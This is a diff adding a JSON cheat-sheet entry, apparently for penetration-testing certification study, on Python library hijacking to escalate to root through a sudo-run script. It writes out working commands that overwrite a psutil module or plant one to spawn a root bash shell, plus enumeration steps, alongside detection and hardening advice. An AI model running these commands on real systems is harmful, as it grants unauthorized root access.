@@ -1,0 +1,114 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "python3",
+    "sudo"
+  ],
+  "tags": [
+    "python",
+    "library-hijacking",
+    "sudo"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Python Library Hijacking",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Payload injected into the imported module",
+      "command": "import os\nos.system('id')"
+    },
+    {
+      "label": "Locate the module and its writable function",
+      "command": "pip3 show psutil\ngrep -r \"def virtual_memory\" /usr/local/lib/python3.8/dist-packages/psutil/*"
+    }
+  ],
+  "notes": "A file can be writable even when its parent dir is not - always check the individual module file, not just the directory. Return a dummy object matching expected attributes (.available/.total) so the script doesn't crash before you get the shell.",
+  "references": [
+    {
+      "title": "Python sys.path / import system",
+      "url": "https://docs.python.org/3/library/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sudo-abuse",
+      "note": "Requires a sudo-runnable python script.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "python-library-hijacking",
+  "name": "Python Library Hijacking - Sudo Script Abuse",
+  "command": "sudo /usr/bin/python3 ./mem_status.py",
+  "description": "A root-run Python script that imports a module you can influence lets you hijack it. Four vectors depending on what is writable / whether SETENV is allowed - overwrite the module, drop a same-named module earlier in sys.path, use PYTHONPATH, or edit the script.",
+  "variations": [
+    {
+      "label": "Writable module file",
+      "command": "# overwrite the imported module, defining the called function:\ncat > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py << 'EOF'\nimport os\nclass Mem:\n    available = 100\n    total = 100\ndef virtual_memory():\n    os.system('/bin/bash')\n    return Mem()\nEOF"
+    },
+    {
+      "label": "Writable sys.path dir",
+      "command": "# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):\nprintf '#!/usr/bin/env python3\\nimport os\\ndef virtual_memory():\\n    os.system(\"id\")\\n' > /usr/lib/python3.8/psutil.py"
+    },
+    {
+      "label": "PYTHONPATH (SETENV allowed)",
+      "command": "sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py"
+    },
+    {
+      "label": "Writable script",
+      "command": "echo 'import os; os.system(\"/bin/bash\")' >> /path/to/script.py"
+    }
+  ],
+  "steps": [
+    {
+      "label": "1. Enumerate sudo + the target script's imports",
+      "command": "sudo -l   # note the runnable script AND whether SETENV is present\ncat mem_status.py   # which module + function is called (e.g. psutil.virtual_memory())"
+    },
+    {
+      "label": "2. Locate the module and check writability",
+      "command": "python3 -c \"import psutil; print(psutil.__file__)\"\nls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py\npython3 -c 'import sys; print(\"\\n\".join(sys.path))'"
+    },
+    {
+      "label": "3. Hijack (pick a vector above) and run as root",
+      "command": "sudo /usr/bin/python3 ./mem_status.py"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1574"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Python resolves imports by searching sys.path in order. If a directory earlier in sys.path is writable by the attacker, placing a malicious module with the same name as a legitimate one there causes Python to import the attacker's module instead. When a script is run as root via sudo, the attacker's module code executes as root. Alternatively, if the installed module file itself is writable, it can be modified directly.",
+    "prerequisites": "A Python script runnable via sudo. The script imports a module whose file is writable, or a directory earlier in sys.path is writable. SETENV may be needed for PYTHONPATH manipulation.",
+    "impact": "Arbitrary code execution as root when the sudo-privileged Python script is run. Full system compromise from a Python library writable by a low-privileged user.",
+    "detection": "Modification of Python module files (.py, __init__.py) by non-root. New .py files created in system Python paths. Auditd: write to /usr/local/lib/python3.x/ by non-root. SIEM: sudo python script execution shortly after module file modification.",
+    "artifacts": "Auditd: write to Python module file by non-root | File integrity alert (module file modified) | sudo log: python script execution by non-root",
+    "prevention": "Ensure all Python module files in system paths are owned by root and not writable by non-root (chmod 644 owned by root). Never allow SETENV for Python in sudoers. Audit Python sys.path for writable directories. Pin library versions and verify with checksums.",
+    "misconfiguration": "Python module file (e.g., /usr/local/lib/python3.8/dist-packages/psutil/__init__.py) owned by a non-root user or world-writable. sudoers allows running Python script that imports this module as root.",
+    "vulnerable_config": "# Vulnerable module permissions\n-rw-r--r-- 1 htb-student staff ... /usr/local/lib/python3.8/dist-packages/psutil/__init__.py\n\n# sudoers: allows python as root\nhtb-student ALL=(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py",
+    "secure_config": "# Fix module ownership and permissions\nchown -R root:root /usr/local/lib/python3.8/\nchmod -R 644 /usr/local/lib/python3.8/dist-packages/**/*.py\n\n# Restrict SETENV in sudoers (default)\n# Never add SETENV for Python scripts in sudoers\n\n# Use virtual environments with locked dependencies\npip install --require-hashes -r requirements.txt",
+    "sources": [
+      "HTB M25",
+      "MITRE T1574.006",
+      "MITRE T1548.003"
+    ]
+  }
+}
